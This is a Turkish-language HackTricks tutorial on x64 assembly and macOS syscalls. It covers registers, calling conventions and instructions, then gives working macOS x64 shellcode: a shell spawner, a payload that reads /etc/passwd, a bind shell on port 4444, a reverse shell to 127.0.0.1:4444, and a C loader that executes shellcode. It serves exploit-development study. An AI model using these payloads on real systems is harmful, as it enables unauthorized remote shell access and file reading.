# x64'e Giriş

{{#include ../../../banners/hacktricks-training.md}}

## **x64'e Giriş**

x64 veya x86-64 olarak da bilinen x64, çoğunlukla masaüstü ve sunucu bilişiminde kullanılan 64-bit bir processor architecture'dır. Intel tarafından üretilen x86 architecture'ından türemiş ve daha sonra AMD tarafından AMD64 adıyla benimsenmiştir; günümüzde kişisel bilgisayarlarda ve sunucularda yaygın olarak kullanılan architecture'dır.

### **Register'lar**

x64, x86 architecture'ını genişleterek `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` ve `r8` ile `r15` arasındaki register'lar olarak adlandırılan **16 genel amaçlı register** içerir. Bunların her biri **64-bit** (8-byte) değer depolayabilir. Bu register'ların ayrıca uyumluluk ve özel görevler için 32-bit, 16-bit ve 8-bit alt register'ları da bulunur.

1. **`rax`** - Geleneksel olarak function'lardan dönen **return value'lar** için kullanılır.
2. **`rbx`** - Memory işlemleri için sıklıkla **base register** olarak kullanılır.
3. **`rcx`** - Genellikle **loop counter'ları** için kullanılır.
4. **`rdx`** - Genişletilmiş arithmetic işlemleri de dahil olmak üzere çeşitli rollerde kullanılır.
5. **`rbp`** - Stack frame için **base pointer**.
6. **`rsp`** - Stack'in tepesini takip eden **stack pointer**.
7. **`rsi`** ve **`rdi`** - String/memory işlemlerinde **source** ve **destination** index'leri için kullanılır.
8. **`r8`** ile **`r15`** arası - x64'te tanıtılan ek genel amaçlı register'lar.

### **Calling Convention**

x64 calling convention'ı operating system'ler arasında değişiklik gösterir. Örneğin:

- **Windows**: İlk **dört parameter**, **`rcx`**, **`rdx`**, **`r8`** ve **`r9`** register'larında aktarılır. Sonraki parameter'lar stack üzerine push edilir. Return value **`rax`** içindedir.
- **System V (UNIX-like system'lerde yaygın olarak kullanılır)**: İlk **altı integer veya pointer parameter**, **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** ve **`r9`** register'larında aktarılır. Return value yine **`rax`** içindedir.

Function'ın altıdan fazla input'u varsa, **geri kalanı stack üzerinde aktarılır**. Stack pointer olan **RSP**, **16 byte hizalanmış** olmalıdır; bu, gösterdiği address'in herhangi bir call gerçekleşmeden önce 16'ya bölünebilir olması gerektiği anlamına gelir. Bu nedenle normalde bir function call yapmadan önce shellcode'umuzda RSP'nin uygun şekilde hizalandığından emin olmamız gerekir. Ancak pratikte system call'lar, bu gereksinim karşılanmasa bile çoğu zaman çalışır.

### Swift'te Calling Convention

Swift'in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) adresinde bulunabilen kendi **calling convention**'ı vardır.

### **Yaygın Instruction'lar**

x64 instruction'ları, önceki x86 instruction'larıyla uyumluluğu koruyan ve yenilerini tanıtan zengin bir instruction set'ine sahiptir.

- **`mov`**: Bir değeri bir **register** veya **memory location**'dan diğerine **taşır**.
- Örnek: `mov rax, rbx` — `rbx` içindeki değeri `rax`'e taşır.
- **`push`** ve **`pop`**: Değerleri **stack**'e push eder veya stack'ten pop eder.
- Örnek: `push rax` — `rax` içindeki değeri stack'e push eder.
- Örnek: `pop rax` — Stack'teki en üst değeri stack'ten `rax`'e pop eder.
- **`add`** ve **`sub`**: **Toplama** ve **çıkarma** işlemleri.
- Örnek: `add rax, rcx` — `rax` ve `rcx` içindeki değerleri toplar ve sonucu `rax` içinde depolar.
- **`mul`** ve **`div`**: **Çarpma** ve **bölme** işlemleri. Not: Bunların operand kullanımıyla ilgili özel davranışları vardır.
- **`call`** ve **`ret`**: **Function'ları çağırmak** ve **function'lardan dönmek** için kullanılır.
- **`int`**: Bir software **interrupt**'ını tetiklemek için kullanılır. Örneğin `int 0x80`, 32-bit x86 Linux'ta system call'lar için kullanılırdı.
- **`cmp`**: İki değeri **karşılaştırır** ve CPU flag'lerini sonuca göre ayarlar.
- Örnek: `cmp rax, rdx` — `rax` ile `rdx`'i karşılaştırır.
- **`je`, `jne`, `jl`, `jge`, ...**: Önceki bir `cmp` veya test sonucuna göre control flow'u değiştiren **conditional jump** instruction'larıdır.
- Örnek: `cmp rax, rdx` instruction'ından sonra `je label` — `rax`, `rdx`'e eşitse `label`'a atlar.
- **`syscall`**: Bazı x64 system'lerinde (modern Unix gibi) **system call**'lar için kullanılır.
- **`sysenter`**: Bazı platformlarda optimize edilmiş bir **system call** instruction'ıdır.

### **Function Prologue**

1. **Eski base pointer'ı push et**: `push rbp` (caller'ın base pointer'ını kaydeder)
2. **Mevcut stack pointer'ı base pointer'a taşı**: `mov rbp, rsp` (mevcut function için yeni base pointer'ı ayarlar)
3. **Local variable'lar için stack üzerinde alan ayır**: `sub rsp, <size>` (burada `<size>`, gereken byte sayısıdır)

### **Function Epilogue**

1. **Mevcut base pointer'ı stack pointer'a taşı**: `mov rsp, rbp` (local variable'ların alanını serbest bırakır)
2. **Eski base pointer'ı stack'ten pop et**: `pop rbp` (caller'ın base pointer'ını geri yükler)
3. **Dön**: `ret` (control'ü caller'a geri döndürür)

## macOS

### syscalls

Farklı syscall sınıfları vardır; bunları [**burada bulabilirsiniz**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Ardından, her syscall numarasını [**bu URL'de**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Dolayısıyla **Unix/BSD class** içinden `open` syscall'ını (**5**) çağırmak için bunu eklemeniz gerekir: `0x2000000`

Buna göre open'ı çağıracak syscall numarası `0x2000005` olur

### Shellcodes

Derlemek için:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Byte'ları çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Shellcode'u test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**buradan**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### cat ile okuma

Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` çalıştırmaktır; bu nedenle ikinci argüman (x1), parametrelerden oluşan bir dizidir (bellekte bu, adreslerin bulunduğu bir stack anlamına gelir).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Komutu sh ile çalıştırma
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) adresindeki **4444 portundaki** Bind shell<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) adresinden Reverse shell. **127.0.0.1:4444** adresine Reverse shell<sup>[[3]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Referanslar

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
